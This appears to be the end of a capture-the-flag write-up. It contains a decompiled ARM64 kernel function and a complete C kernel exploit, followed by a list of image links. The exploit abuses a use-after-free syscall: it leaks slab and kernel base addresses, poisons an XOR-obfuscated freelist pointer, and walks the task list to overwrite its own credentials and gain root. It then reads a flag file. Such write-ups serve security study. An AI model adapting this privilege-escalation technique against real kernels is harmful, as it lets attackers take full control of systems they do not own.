__int64 __fastcall sub_FFFFFFC010216910(unsigned __int64 a1){  unsigned __int64 v1; // x30  char *v2; // x18  __int64 v3; // x8  _BYTE *v4; // x8  __int64 result; // x0
  __writex18qword(8u, v1);  v2 = (char *)KeGetPcr() + 8;  __setReg(18, v2);  if ( !(a1 >> 52)    && !(a1 >> 36)    && qword_FFFFFFC011A7A8A8    && (v3 = *(_QWORD *)(qword_FFFFFFC011A7A8A8 + ((a1 >> 23) & 0x1FFFFFFFFF8i64))) != 0    && (v4 = (_BYTE *)(v3 + 16i64 * (unsigned __int8)(a1 >> 18))) != 0i64    && (*v4 & 2) != 0 )  {    result = sub_FFFFFFC0103F9640(a1 << 12) & 1;  }  else  {    result = 0i64;  }  __setReg(18, v2 - 8);  __setReg(18, (char *)KeGetPcr() - 8);  return result;}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_uaf 602
#define DEBUG#ifndef DEBUG#define printf(...)#define fprintf(...)#define perror(...)#define puts(...)#define setbuf(...)#endif
size_t read_word(size_t addr){    size_t result = 0;    syscall(__NR_uaf, &addr, 8, (7 << 8)|3);    syscall(__NR_uaf, &result, 8, (8 << 8)|2);    return result;}
size_t write_word(size_t addr, size_t value){    syscall(__NR_uaf, &addr, 8, (7 << 8)|3);    syscall(__NR_uaf, &value, 8, (8 << 8)|3);    return 0;}
size_t get_current_task(){    size_t init_task = 0xffffffc011953e00, task = init_task;    size_t result = 0;    size_t name = 0;    int i = 0;
    #define NAME_OFFSET 0x750    #define TASK_OFFSET 0x488
    while(result == 0 && i++ < 128)    {        task = read_word(task + TASK_OFFSET + 8) - TASK_OFFSET;        printf("task: %#llxn", task);        if(task == init_task)        {            break;        }        name = read_word(task + NAME_OFFSET);        printf("name: %sn", (char *)&name);        if((name & 0xffffff) == 0x00707865) // "exp"        {            result = task;        }    }
    return result;}
int exploit(){    char buf[0x100];    size_t current_task = 0;    size_t cred = 0;    int fd;    size_t slab1, slab2, kernel_base_addr, key;
    syscall(__NR_uaf, NULL, 0, (0 << 8)|0);    syscall(__NR_uaf, NULL, 0, (1 << 8)|0);    syscall(__NR_uaf, NULL, 0, (2 << 8)|0);    syscall(__NR_uaf, NULL, 0, (3 << 8)|0);    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    syscall(__NR_uaf, NULL, 0, (1 << 8)|1);    syscall(__NR_uaf, NULL, 0, (2 << 8)|1);    syscall(__NR_uaf, NULL, 0, (3 << 8)|1);
    syscall(__NR_uaf, NULL, 0, (4 << 8)|0);    if((fd = open("/dev/ptmx", O_RDONLY)) == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    syscall(__NR_uaf, NULL, 0, (5 << 8)|0);
    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 8, (1 << 8)|2);    slab1 = *(size_t*)(buf+0) - 0x60;    printf("slab1: %#llxn", slab1);
    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 0x28, (2 << 8)|2);    slab2 = *(size_t*)(buf+0) - 0x60;    printf("slab2: %#llxn", slab2);        kernel_base_addr = *(size_t*)(buf+0x20) - 0xdac3b8;    printf("kernel_base_addr: %#llxn", kernel_base_addr);
    close(fd);
    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 8, (1 << 8)|2);    key = *(size_t*)(buf+0) ^ slab2;    printf("key: %#llxn", key);
    memset(buf, 0, sizeof(buf));    *(size_t*)(buf+0) = key ^ 0xffffffc011a4dfb8;    syscall(__NR_uaf, buf, 8, (1 << 8)|3);
    syscall(__NR_uaf, NULL, 0, (6 << 8)|0);    syscall(__NR_uaf, NULL, 0, (7 << 8)|0);
    syscall(__NR_uaf, NULL, 0, (1 << 8)|1);    memset(buf, 0, sizeof(buf));    *(size_t*)(buf+0) = key ^ 0;    syscall(__NR_uaf, buf, 8, (1 << 8)|3);
    write_word(0xFFFFFFC011A7A8A8, 0);
    current_task = get_current_task();    printf("current_task: %#lxn", current_task);    cred = read_word(current_task + 0x738);    printf("cred: %#lxn", cred);        *(size_t*)(buf+0) = cred + 4;    syscall(__NR_uaf, buf, 8, (7 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 0x20, (8 << 8)|3);
    printf("uid: %dn", getuid());
    return 0;}
int readflag(){    int fd = 0;    char buf[0x100];    int result;
    fd = open("/system/flag", O_RDONLY);    if(fd == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    memset(buf, 0, sizeof(buf));    result = read(fd, buf, sizeof(buf)-1);    printf("result: %dn", result);    write(STDOUT_FILENO, buf, result);
    close(fd);
    return 0;}

int main(){    setbuf(stdout, NULL);
    puts("Start");
    exploit();
    readflag();
    puts("End");
    return 0;}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/5-1693358633.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/5-1693358633.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/4-1693358633.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/5-1693358634.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/9-1693358634.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/0-1693358634.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/4-1693358634.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/2-1693358635.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/10-1693358635.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/1-1693358635.gif)